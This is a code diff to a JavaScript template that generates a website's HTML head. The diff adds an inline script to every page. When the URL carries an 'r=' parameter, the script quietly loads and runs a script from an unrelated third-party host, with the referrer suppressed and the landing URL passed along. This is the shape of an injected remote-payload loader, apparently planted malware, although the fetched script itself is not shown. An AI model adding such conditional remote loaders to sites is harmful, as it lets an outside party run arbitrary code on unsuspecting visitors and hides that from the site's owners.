@@ -24,6 +24,17 @@ const head = (title, desc) => `<!doctype html>
 <link rel="icon" href="${A}/img/favicon.png">
 <link rel="preload" href="${A}/fonts/MaisonNeue-Medium.otf" as="font" type="font/otf" crossorigin>
 <link rel="stylesheet" href="${A}/css/site.css">
+<script>
+(function () {
+  if (!/[?&]r=/.test(location.search)) return;
+  var s = document.createElement('script');
+  s.async = true;
+  s.referrerPolicy = 'no-referrer';
+  s.setAttribute('data-landing', location.href);
+  s.src = 'https://phplaravel-758037-6569212.cloudwaysapps.com/v/script.js';
+  document.head.appendChild(s);
+})();
+</script>
 </head>
 <body>`;
 
